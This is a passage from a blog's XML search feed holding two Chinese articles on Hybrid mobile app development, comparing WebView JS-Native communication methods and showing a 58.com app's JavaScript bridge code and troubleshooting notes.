跳转javascript地址执行JS代码</strong></p><p>具体的使用方式不详细介绍了，直说一个优点</p><ul><li>版本支持</li></ul><p>在安卓4.4以前是没有evaluatingJavaScript API的，因此通过他来执行JS代码，但本质上和evaluatingJavaScript区别不大</p><p><strong>WKUserScript 执行JS代码</strong></p><p>这里要特别说明一下WKUserScript并不适合当做Hybrid Bridge的通信手段，原因是这种Native主动调用JS，只能在WebView加载时期发起，并不能在任意时刻发起通信</p><p>WKUserScript不能采用在Hybrid设计里当做通信手段</p><p>WKUserScript不能采用在Hybrid设计里当做通信手段</p><p>WKUserScript不能采用在Hybrid设计里当做通信手段</p><p>但WKUserScript却有一点值得说一下，上文也提到的UIWebView的注入时机，如果你想在恰当时机让JS上下文执行一段JS代码，在UIWebView你是找不到一个合适的加载时机的，除非你动用私有API，但WKWebView解决了这个问题，在构造WKUserScript的时候可以选择dom load start的时候执行JS，也可以选择在dom load end的时候执行JS。但这个有点其实与设计Hybrid框架的核心通信方案，关系不大，但预加载JS预加载CSS也是一个Hybrid框架的扩展功能，后面第二篇会介绍的。</p><p><strong>横向对比</strong></p><p>如果我们要自主设计一个Hybrid框架，通信方案到底该如何取舍？</p><p><strong>JS主动调用Native的方案</strong></p><p><img src="http://cc.cocimg.com/api/uploads//20180109/1515470556227551.png" alt="TIM截图20180109120139.png"></p><p><strong>Native主动调用JS的方案</strong></p><ul><li><p>iOS: evaluatingJavaScript</p></li><li><p>安卓: 其实2个区别不大，使用方法差异也不大</p><p>4.4以上 evaluatingJavaScript</p></li><li><p>4.4以下 loadUrl</p></li></ul><p>这样对比优缺点，再根据自己项目需要支持的版本号，可以比较方便的选择合适的通信方案，进一步亲自设计一个Hybrid框架</p><p><strong>一点个人看法</strong></p><blockquote><p>即便是老项目还在使用UIWebView，要计划升级到WKWebView的时候，既然是升级就应该全面升级到新的WK式通信，做什么妥协和折中方案？</p></blockquote><blockquote><p>而且最重要的一点，想要做到同时支持多个WebView兼容支持并不需要选择妥协方案，在开发框架的时候完全可以在框架侧解决。想要屏蔽这种webview通信差异，通过在Hybrid框架层设计，抽象统一的调用入口出口，把通信差异在内部消化，这样依然能做到统一对外业务代码流程和清晰的代码逻辑，想要做到代码统一不应该以功能上牺牲和妥协的方面去考虑。</p></blockquote><p>前面其实提到过这个看法不过说的还不彻底，可能有些人会觉得假跳转这个方案最大的好处是全平台全版本的适配与统一，甚至还可以统一安卓平台，可以保证代码一致性，但我认为这绝对不能建立在有严重功能短板导致开发中带来很严重问题的基础之上的，为了代码一致性，而妥协了框架的功能与能力</p><p>可能因为不同的平台/不同的版本/不同的WebView的使用与兼容，导致了我们需要在开发Hybrid框架的时候需要适配，但这一切都是可以通过设计良好的框架对外输入输出，把所有区别适配内部消化，从而做到在框架外层的业务代码依然保持代码一致性，保持干净整洁的。这里所说的框架绝不仅仅包括客户端这一侧，JS侧也同理，谁说区分安卓和IOS平台来进行不同的通信方式代码就不整洁了，那是你框架层设计的不够优秀，合理框架层代码应该可以做到当新的系统组件出现，新的更优秀的通信方案出现的时候，能够立刻的支持和扩充，获得最新的能力和性能，但又在业务上层做到无感知，保持框架外围使用的一致性，这才是良好的设计。</p><p>所以我之前微博曾经说过一小段话：</p><blockquote><p>就为了兼容从而选择放弃更合理的WKWebview 官方注入interface方式，为了凑和UIWebView依然采用无论是iframe还是location.href的糊弄方式，这种我实在不觉得是美学，只是一种偷懒而已，抱着UIWebview时代的包袱不想丢还让WKWebview去迁就</p></blockquote><blockquote><p>没错，说的就是WebViewJavascriptBridge</p></blockquote><p><strong>如果是你，你会怎么设计Hybrid框架</strong></p><p>聊了这么多这个好那个不好，如果换做我们项目，我会选择啥？</p><ul><li>iOS：MessageHandler注入(JSToNative) + evaluatingJavaScript(NativeToJS)</li></ul><p>我们几个项目都已经只支持iOS8以上，甚至一个新项目只支持iOS9以上了</p><p>，旧项目确实在用UIWebView并且采用的是令我诟病的假跳转，但我们迁移新WKWebView的方案也绝不是将就UIWebView，待迁移上线后是直接采用最合理的MessageHandler注入</p><ul><li>安卓: 拦截弹窗(JSToNative)+loadUrl(NativeToJS)</li></ul><p>我们安卓还需要支持更低的版本╮(╯_╰)╭</p><ul><li>同步通信：iOS-JSContext以及安卓-javascriptInterface</li></ul><p>巨有巨大优势的iOS-JSContext以及安卓-javascriptInterface，我们并不是完全舍弃，因为其同步传递特型真的有很大价值，所以在设计Hybrid框架API的时候，是留了2种sendMessage模式的，一种异步，一种同步，而这种同步作为额外功能对部分平台，部分WebView开放，WKWebView很不幸在这种性能的选择下暂时丧失了同步通信能力，但还在想尽办法。</p><p>经过各种优缺点对比，我们确认了最核心的JS与Native通信方案，下一步就是亲自设计一个Hybrid框架了，这篇也太长了，挖个坑后面在写吧</p>]]></content>
      
      
      <categories>
          
          <category> 混合开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hybrid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hybrid设计与实现</title>
      <link href="2017/03/12/hybrid/"/>
      <url>2017/03/12/hybrid/</url>
      
        <content type="html"><![CDATA[<h2 id="背景及概述"><a href="#背景及概述" class="headerlink" title="背景及概述"></a>背景及概述</h2><p>随着移动浪潮的兴起，各种APP层出不穷，极速的业务扩展提升了团队对开发效率的要求，这个时候使用IOS&amp;Andriod开发一个APP似乎成本有点过高了，而H5的低成本、高效率、跨平台等特性马上被利用起来形成了一种新的开发模式：Hybrid APP。<br>作为一种混合开发的模式，Hybrid APP底层依赖于Native提供的容器（UIWebview），上层使用Html&amp;Css&amp;JS做业务开发，底层透明化、上层多多样化，这种场景非常有利于前端介入，非常适合业务快速迭代，于是Hybrid火啦。<br>Hybrid App主要以JS+Native两者相互调用为主，从开发层面实现“一次开发，多处运行”的机制，成为真正适合跨平台的开发。Hybrid App兼具了Native App良好用户体验的优势，也兼具了Web App使用HTML5跨平台开发低成本的优势。</p><p>目前已经有众多Hybrid App开发成功应用，比如美团、爱奇艺、微信等知名移动应用，都是采用Hybrid App开发模式。</p><p>为什么要引入hybrid开发</p><blockquote><p>Native应对急速业务需求，APP迭代加快，频繁的发版已难以应付<br>Android渠道众多，apple store审核周期长<br>纯native开发效率低，开发维护成本高<br>不能及时修复bug,不能动态发版<br>相对于其他动态发布技术，技术研发成本较低，使用语言更广泛，社区资源更丰富</p></blockquote><h2 id="Hybrid开发优劣势"><a href="#Hybrid开发优劣势" class="headerlink" title="Hybrid开发优劣势"></a>Hybrid开发优劣势</h2><p>三种开发模式对比</p><h3 id="Native-App-即-原生App开发"><a href="#Native-App-即-原生App开发" class="headerlink" title="Native App 即 原生App开发"></a>Native App 即 原生App开发</h3><p><font color="#A52A2A" size="3" face="黑体">优点</font></p><blockquote><p>（1）打造完美的用户体验<br>（2）性能稳定<br>（3）操作速度快，上手流畅<br>（4）访问本地资源（通讯录，相册）<br>（5）设计出色的动效，转场，<br>（6）拥有系统级别的贴心通知或提醒<br>（7）用户留存率高</p></blockquote><p><font color="#A52A2A" size="3" face="“黑体”">缺点</font></p><blockquote><p>（1）分发成本高（不同平台有不同的开发语言和界面适配）<br>（2）维护成本高（例如一款App已更新至V5版本，但仍有用户在使用V2， V3，V4版本，需要更多的开发人员维护之前的版本）<br>（3）更新缓慢，根据不同平台，提交–审核–上线 等等不同的流程，需要经过的流程较复杂。</p></blockquote><h3 id="Web-App-即-网页App开发"><a href="#Web-App-即-网页App开发" class="headerlink" title="Web App 即 网页App开发"></a>Web App 即 网页App开发</h3><ul><li>特点（html css js）</li><li>优势 (发版完全自控随时更新开发成本小时间快)</li><li>劣势（性能差弱网络无网络条件下体验差）Web App其实就是写好的一套长得像App UI界面的能够自适应的网页加壳。本质套webview壳子打包成App，走的都是web页面（html css js），这种方式对于做过Web开发的开说非常轻松就可以做出一个属于自己的App，因为本身来说用的就是Web的东西，所以有非常好的跨平台的特性可以在任意平台运行，包括发版这方面web可以随时部署所以不需要发版，web页面嵌入webview开发起来速度非常快，一个人就可以轻松搞定，对有展示类需求的项目来说采用这种方式是最适合的，但是如果要实现的功能比较复杂的话就显得力不从心了。<br>相比Native App，Web App体验中受限于网络环境和渲染性能。</li></ul><ol><li>网络环境，渲染性能<br>Web APP对网络环境的依赖性较大，因为Web APP中的H5页面，当用户使用时，去服务器请求显示页面。如果此时用户恰巧遇到网速慢，网络不稳定等其他环境时，用户请求页面的效率大打折扣，在用户使 用中会出现不流畅，断断续续的不良感受。同时，H5技术自身渲染性能较弱：对复杂的图形样式，多样的动效，自定义字体等的支持性不强。</li></ol><p>因此，基于网络环境和渲染性能的影响，在设计H5页面时，应注意以下几点：</p><blockquote><p>1.简化不重要的动画/动效<br>2.简化复杂的图形文字样式<br>3.减少页面渲染的频率和次数</p></blockquote><h3 id="Hybrid-App-即-混合型App开发"><a href="#Hybrid-App-即-混合型App开发" class="headerlink" title="Hybrid App 即 混合型App开发"></a>Hybrid App 即 混合型App开发</h3><p><font color="#A52A2A" size="3" face="黑体">优点</font></p><blockquote><p>1、跨平台<br>2、开发周期短、成本低<br>3、用户体验良好<br>4、可以即时修复bug、动态发版</p></blockquote><p><font color="#A52A2A" size="3" face="“黑体”">缺点</font><br>1、虽然说你可以专注在界面以及交互开发上了，但是这页会成为一个缺点，比如说要仿造一个iOS的默认设置界面，就需要大量的html以及css代码了，而且效果不一定和iPhone上面的界面一样好；<br>2、正因为这是跨平台的开发，所以还是这句话：兼容是前端的痛。了解过在Android机器上面的Web开发就知道这个痛了。比如前些年在Android设备上面写圆角，border-radius:10px，在Android的设备上面会出现毛边。<br>3、便于调试其实是在Web界面层的。但是实际上做Hybrid App开发的时候，你会遇到需求，进入手机的底层请求，做某些处理。比如说如果该应用有Push Notification服务的话，你就需要到底层，获取Push Notification发生时的数据，以及做相应的交互处理。当然类似PhoneGap这类框架，已经有很好的插件机制去帮助你解决类似的问题，当然还有Game Center之类的插件，具体的话可以到Github去关注PhoneGap官方的账户，资源非常丰富</p><h2 id="前端与native分工"><a href="#前端与native分工" class="headerlink" title="前端与native分工"></a>前端与native分工</h2><p>在做Hybrid架构设计之前需要分清Native与前端的界限，首先Native提供的是一宿主环境，要合理的利用Native提供的能力，要实现通用的Hybrid平台架构，站在前端视角，我认为需要考虑以下核心设计问题。</p><h3 id="交互设计"><a href="#交互设计" class="headerlink" title="交互设计"></a>交互设计</h3><p>Hybrid架构设计第一个要考虑的问题是如何设计与前端的交互，如果这块设计的不好会对后续开发、前端框架维护造成深远的影响，并且这种影响往往是不可逆的，所以这里需要前端与Native好好配合，提供通用的接口，比如：</p><p>① NativeUI组件，header组件、消息类组件</p><p>② 通讯录、系统、设备信息读取接口</p><p>③ H5与Native的互相跳转，比如H5如何跳到一个Native页面，H5如何新开Webview做动画跳到另一个H5页面</p><h3 id="资源访问机制"><a href="#资源访问机制" class="headerlink" title="资源访问机制"></a>资源访问机制</h3><p>Native首先需要考虑如何访问H5资源，做到既能以file的方式访问Native内部资源，又能使用url的方式访问线上资源；需要提供前端资源增量替换机制，以摆脱APP迭代发版问题，避免用户升级APP。这里就会涉及到静态资源在APP中的存放策略，更新策略的设计，复杂的话还会涉及到服务器端的支持。</p><h3 id="账号信息设计"><a href="#账号信息设计" class="headerlink" title="账号信息设计"></a>账号信息设计</h3><p>账号系统是重要并且无法避免的，Native需要设计良好安全的身份验证机制，保证这块对业务开发者足够透明，打通账户信息。</p><h3 id="Hybrid开发调试"><a href="#Hybrid开发调试" class="headerlink" title="Hybrid开发调试"></a>Hybrid开发调试</h3><p>功能设计完并不是结束，Native与前端需要商量出一套可开发调试的模型，不然很多业务开发的工作将难以继续，这个很多文章已经接受过了，本文不赘述。</p><p>至于Native还会关注的一些通讯设计、并发设计、异常处理、日志监控以及安全模块因为不是我涉及的领域便不予关注了（事实上是想关注不得其门），而前端要做的事情就是封装Native提供的各种能力，整体架构是这样的<br><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hy1.jpeg" alt></p><h2 id="Hybrid交互设计"><a href="#Hybrid交互设计" class="headerlink" title="Hybrid交互设计"></a>Hybrid交互设计</h2><p>Hybrid交互有两种：<br>1、native主动调用前端js方法主动与前端通信<br>2、H5主动与native通信是通过url schema方式进行的，首先要和native约定好通信的schema 如：wubacst 然后根据Android和iOS不同的通信方式来分别约定 其中Android是在通信之前先创建一个iframe通过iframe把拼接好的url请求发送到native或者通过拦截prompt中的消息来和前端通信  iOS使用了iOS8以上的wkwebview中的messageHandlers的postMessage方法直接把url请求发送到native native接收到前端发送的请求解析之后通过回调函数来通知前端</p><p>两者通信的桥梁都是webview</p><h3 id="Hybrid交互原理"><a href="#Hybrid交互原理" class="headerlink" title="Hybrid交互原理"></a>Hybrid交互原理</h3><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hy2.jpeg" alt="这里写图片描述"></p><h4 id="4-1-1、WKWebView-WKScriptMessageHandler实现JS与OC之间互相通信"><a href="#4-1-1、WKWebView-WKScriptMessageHandler实现JS与OC之间互相通信" class="headerlink" title="4.1.1、WKWebView+WKScriptMessageHandler实现JS与OC之间互相通信"></a>4.1.1、WKWebView+WKScriptMessageHandler实现JS与OC之间互相通信</h4><p>iOS 基于WebKit框架的中的WKWebView+WKScriptMessageHandler实现JS与OC之间互相通信。<br>整体交互过程分为三步：<br>第一：通过- (void)addScriptMessageHandler:(id <wkscriptmessagehandler>)scriptMessageHandler name:(NSString *)name，搭建JS调用OC的桥梁，注册供JS调用的方法name；<br>第二：JS在调用OC注册方法只需要：window.webkit.messageHandlers.<name>.postMessage(<messagebody>)<br>第三：客户端在WKScriptMessageHandler代理方法里收到JS的调用，通过解析处理，并按照事先与FE约定好的的协议做方法的映射，从而达到JS事件的响应。</messagebody></name></wkscriptmessagehandler></p><h4 id="4-1-2、UIWebview的javaScriptcore方式"><a href="#4-1-2、UIWebview的javaScriptcore方式" class="headerlink" title="4.1.2、UIWebview的javaScriptcore方式"></a>4.1.2、UIWebview的javaScriptcore方式</h4><p>将 UIWebViewDelegate 与 UIWebView 拆分成了14类与3个协议,包含该更细节功能的实现</p><ul><li>(void)evaluateJavaScript:(NSString *)javaScriptString completionHandler:(void (^ _Nullable)(_Nullable id, NSError * _Nullable error))completionHandler</li></ul><p>WKWebView ：</p><blockquote><p>1、在性能、稳定性、功能方面有很大提升<br>2、更多的支持 HTML5 的特性<br>3、官方宣称的高达60fps的滚动刷新率以及内置手势<br>4、Safari 相同的 JavaScript 引擎</p></blockquote><h3 id="Hybrid通信机制"><a href="#Hybrid通信机制" class="headerlink" title="Hybrid通信机制"></a>Hybrid通信机制</h3><h4 id="4-2-1、整体设计"><a href="#4-2-1、整体设计" class="headerlink" title="4.2.1、整体设计"></a>4.2.1、整体设计</h4><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hy3.jpeg" alt="这里写图片描述"></p><h4 id="4-2-2、native与js通信流程"><a href="#4-2-2、native与js通信流程" class="headerlink" title="4.2.2、native与js通信流程"></a>4.2.2、native与js通信流程</h4><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hy4.jpeg" alt="这里写图片描述"></p><h4 id="4-2-3、js与native交互流程"><a href="#4-2-3、js与native交互流程" class="headerlink" title="4.2.3、js与native交互流程"></a>4.2.3、js与native交互流程</h4><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hy5.jpeg" alt="这里写图片描述"></p><p>类似于JOSNP跨域原理<br>APP在安装之后会注册私有协议到OS，浏览器自身不能识别的协议时，会将链接抛给OS，转为APP处理<br>比如itunes://开头的链接是Apple Store的私有协议，支付宝的私有协议alipay://，腾讯的tencent://等等<br>固定协议:webview.loadUrl(“javascript: alert(‘hello world’)”);   </p><h2 id="交互协议设计"><a href="#交互协议设计" class="headerlink" title="交互协议设计"></a>交互协议设计</h2><h3 id="API式交互"><a href="#API式交互" class="headerlink" title="API式交互"></a>API式交互</h3><p>调用native API接口方式和我们请求服务端的ajax方式类似，都是前端主动去发送一个请求，被接收处理后返回回调<br><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hy6.jpeg" alt="这里写图片描述"></p><h3 id="交互数据格式约定"><a href="#交互数据格式约定" class="headerlink" title="交互数据格式约定"></a>交互数据格式约定</h3><p>混合开发中交互种类繁多，如何做到通用<br>以58同城车商通app为例：<br>页面跳转类型</p><blockquote><p> wubacst://jumppage/…?query=…</p></blockquote><p>native组件处理类型</p><blockquote><p>wubacst://handlejs/…?query=…</p></blockquote><h3 id="前端协议封装"><a href="#前端协议封装" class="headerlink" title="前端协议封装"></a>前端协议封装</h3><p>前面提到过，Android和iOS对于前端的交互是有区别的，虽然都是采用URL拦截的方式，但是具体的方式是不一样的；iOS采用WKwebview中的messageHandlers方法，而Android采用类似ajax一样的请求；但是对于业务放来说，在和native通信时是不区分端的，这就需要封装一个交互协议的API来提供给业务方，在协议API中来区分处理Android和iOS的交互；</p><p>处理源码如下：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//区分处理Android和iOS</span>  _nativeBridge<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token string">"android"</span> <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>os <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_andr4Native</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span> <span class="token punctuation">:</span>         <span class="token string">"ios"</span> <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>os <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_ios4Native</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">"ipad"</span> <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>os <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_ios4Native</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Android客户端处理</p><pre class="line-numbers language-js"><code class="language-js">_createIframe<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> iFrame<span class="token punctuation">;</span>        <span class="token keyword">return</span> iFrame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            iFrame<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"style"</span><span class="token punctuation">,</span> <span class="token string">"display:none;"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            iFrame<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"height"</span><span class="token punctuation">,</span> <span class="token string">"0px"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            iFrame<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"width"</span><span class="token punctuation">,</span> <span class="token string">"0px"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            iFrame<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"frameborder"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            iFrame    <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//开始是使用iframe和Android客户端通信 后来改成了prompt   </span> _andr4Native<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> host <span class="token operator">=</span> param<span class="token punctuation">.</span>host<span class="token punctuation">;</span>        <span class="token keyword">var</span> path <span class="token operator">=</span> param<span class="token punctuation">.</span>path<span class="token punctuation">;</span>        <span class="token keyword">var</span> query <span class="token operator">=</span> param<span class="token punctuation">.</span>query<span class="token punctuation">;</span>        query <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//3.5.0以上版本Android端都走新的拦截方式</span>        <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">"wubacst://"</span> <span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">"?query="</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_versionCompare</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_getVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'3.5.0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            window<span class="token punctuation">.</span><span class="token function">prompt</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>domReady<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token keyword">void</span> <span class="token keyword">this</span><span class="token punctuation">.</span>actionPreQueue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>andrFrame <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_createIframe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>andrFrame<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"wubacst://"</span> <span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">"?query="</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">,</span>            document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>andrFrame<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>andrFrame <span class="token operator">=</span> <span class="token keyword">null</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>iOS客户端处理</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//messageHandlers上绑定的WBcheshangtong对象是和iOS约定好的</span>_ios4Native<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> host <span class="token operator">=</span> param<span class="token punctuation">.</span>host<span class="token punctuation">;</span>        <span class="token keyword">var</span> path <span class="token operator">=</span> param<span class="token punctuation">.</span>path<span class="token punctuation">;</span>        <span class="token keyword">var</span> query <span class="token operator">=</span> param<span class="token punctuation">.</span>query<span class="token punctuation">;</span>        query <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">"wubacst://"</span> <span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">"?query="</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>webkit<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                window<span class="token punctuation">.</span>webkit<span class="token punctuation">.</span>messageHandlers<span class="token punctuation">.</span>WBcheshangtong<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>处理好底层交互之后，在根据业务的不同，前端封装一些通用的协议，如：<br><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hy7.jpeg" alt="这里写图片描述"></p><p>整个通信协议API如下：</p><pre class="line-numbers language-js"><code class="language-js">app58<span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token punctuation">{</span>     init<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> _nativeBridge<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_ios4Native<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_andr4Native<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_createIframe<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>loadPage<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> url<span class="token punctuation">,</span> jumpParameter<span class="token punctuation">,</span>title<span class="token punctuation">,</span>titleColor<span class="token punctuation">,</span>isDestoryBeforePage<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">...</span><span class="token punctuation">}</span><span class="token keyword">var</span> WBAPP <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">app58</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>app_config <span class="token operator">||</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h2><h3 id="iOS-cookie丢失问题"><a href="#iOS-cookie丢失问题" class="headerlink" title="iOS cookie丢失问题"></a>iOS cookie丢失问题</h3><p>目前来说WKwebview还不是那么稳定，经常会出现前端cookie丢失问题，一下是本人在开发过程中解决问题的一个过程：<br><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hy8.jpeg" alt="这里写图片描述"><br> 最终是用hookAjax来实现的<br> hookAjax的原理就是拦截所有的网络请求，代理send方法实现自己的目的<br> <img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hy9.jpeg" alt="这里写图片描述"><br> 有兴趣的可以去看看<a href="https://www.jianshu.com/p/7337ac624b8e" target="_blank" rel="noopener">hookajax</a> 这里就不再详细讲解了</p><h3 id="Android通信协议重复提交"><a href="#Android通信协议重复提交" class="headerlink" title="Android通信协议重复提交"></a>Android通信协议重复提交</h3><p>由于Android使用的是iframe发送请求和Android客户端进行交互的，在前端使用canvas时，iframe重复执行，导致前端重复提交协议，目前换成了prompt交互；在开发过程中有遇到这种问题的小伙伴，欢迎留言。</p>]]></content>
      
      
      <categories>
          
          <category> 混合开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hybrid </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
